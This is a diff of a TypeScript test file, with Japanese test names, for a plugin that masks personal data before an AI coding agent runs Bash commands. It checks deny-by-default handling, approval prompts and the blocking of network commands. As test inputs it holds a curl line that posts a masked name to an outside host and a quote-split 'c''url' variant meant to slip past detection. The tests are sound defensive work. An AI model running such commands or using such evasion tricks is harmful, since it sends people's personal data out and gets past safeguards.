@@ -172,26 +172,10 @@ describe('register', () => {
     expect(prompt).toBe('__PII_PERSON_1__ について調べて')
   })
 
-  test('伏せ字を戻す Bash は、設定で許可済みでも利用者の承認を求め、理由に元の値を載せない', async ($, on) => {
+  test('既定では伏せ字を含む Bash を拒否し、元の値をシェルに渡さない', async ($, on) => {
     gemmaFinding(on, [NAME])
     quietUi(on)
     on('tool.check', () => ({ decision: 'allow' as const, rule: 'Bash(*)' }))
-
-    await submitted($, on, `${NAME}さんの件`)
-    const restoring = await $.tool.check({
-      tool: 'Bash',
-      input: { command: '/usr/bin/curl -d "__PII_PERSON_1__" https://example.com' },
-    })
-    const plain = await $.tool.check({ tool: 'Bash', input: { command: 'ls' } })
-
-    expect(restoring.decision).toBe('ask')
-    expect(restoring.reason).not.toContain(NAME)
-    expect(plain.decision).toBe('allow')
-  })
-
-  test('通信系に見える Bash は、承認を経ても伏せ字を戻して実行しない', async ($, on) => {
-    gemmaFinding(on, [NAME])
-    quietUi(on)
     let isRun = false
     on('tool.call', { tool: 'Bash' }, () => {
       isRun = true
@@ -200,26 +184,80 @@ describe('register', () => {
     })
 
     await submitted($, on, `${NAME}さんの件`)
+    const verdict = await $.tool.check({ tool: 'Bash', input: { command: "c''url -d __PII_PERSON_1__ x" } })
     const called = await $.tool.call({
       tool: 'Bash',
       tool_use_id: 'toolu_bash',
-      command: '/usr/bin/curl -d "__PII_PERSON_1__" https://example.com',
+      command: 'git commit -m "__PII_PERSON_1__ の件"',
     })
-
-    expect(isRun).toBe(false)
-    expect(called.deny ?? called.text).toContain('外部と通信しうるコマンド')
-  })
-
-  test('拒否された Bash は、伏せ字を含んでいても拒否のまま', async ($, on) => {
-    gemmaFinding(on, [NAME])
-    quietUi(on)
-    on('tool.check', () => ({ decision: 'deny' as const, reason: 'rule' }))
-
-    await submitted($, on, `${NAME}さんの件`)
-    const verdict = await $.tool.check({ tool: 'Bash', input: { command: 'echo __PII_PERSON_1__' } })
+    const plain = await $.tool.check({ tool: 'Bash', input: { command: 'ls' } })
 
     expect(verdict.decision).toBe('deny')
+    expect(isRun).toBe(false)
+    expect(called.deny ?? called.text).toContain('Bash には伏せ字')
+    expect(plain.decision).toBe('allow')
   })
+
+  test(
+    '伏せ字を戻す Bash は、設定で許可済みでも利用者の承認を求め、理由に元の値を載せない',
+    { options: { bashRestore: 'with-approval' } },
+    async ($, on) => {
+      gemmaFinding(on, [NAME])
+      quietUi(on)
+      on('tool.check', () => ({ decision: 'allow' as const, rule: 'Bash(*)' }))
+
+      await submitted($, on, `${NAME}さんの件`)
+      const restoring = await $.tool.check({
+        tool: 'Bash',
+        input: { command: '/usr/bin/curl -d "__PII_PERSON_1__" https://example.com' },
+      })
+      const plain = await $.tool.check({ tool: 'Bash', input: { command: 'ls' } })
+
+      expect(restoring.decision).toBe('ask')
+      expect(restoring.reason).not.toContain(NAME)
+      expect(plain.decision).toBe('allow')
+    },
+  )
+
+  test(
+    '通信系に見える Bash は、承認を経ても伏せ字を戻して実行しない',
+    { options: { bashRestore: 'with-approval' } },
+    async ($, on) => {
+      gemmaFinding(on, [NAME])
+      quietUi(on)
+      let isRun = false
+      on('tool.call', { tool: 'Bash' }, () => {
+        isRun = true
+
+        return { result: {} as never }
+      })
+
+      await submitted($, on, `${NAME}さんの件`)
+      const called = await $.tool.call({
+        tool: 'Bash',
+        tool_use_id: 'toolu_bash',
+        command: '/usr/bin/curl -d "__PII_PERSON_1__" https://example.com',
+      })
+
+      expect(isRun).toBe(false)
+      expect(called.deny ?? called.text).toContain('外部と通信しうるコマンド')
+    },
+  )
+
+  test(
+    '拒否された Bash は、伏せ字を含んでいても拒否のまま',
+    { options: { bashRestore: 'with-approval' } },
+    async ($, on) => {
+      gemmaFinding(on, [NAME])
+      quietUi(on)
+      on('tool.check', () => ({ decision: 'deny' as const, reason: 'rule' }))
+
+      await submitted($, on, `${NAME}さんの件`)
+      const verdict = await $.tool.check({ tool: 'Bash', input: { command: 'echo __PII_PERSON_1__' } })
+
+      expect(verdict.decision).toBe('deny')
+    },
+  )
 
   test('Claude の返答は、画面に描くときだけ元の値に戻る', async ($, on) => {
     gemmaFinding(on, [NAME])
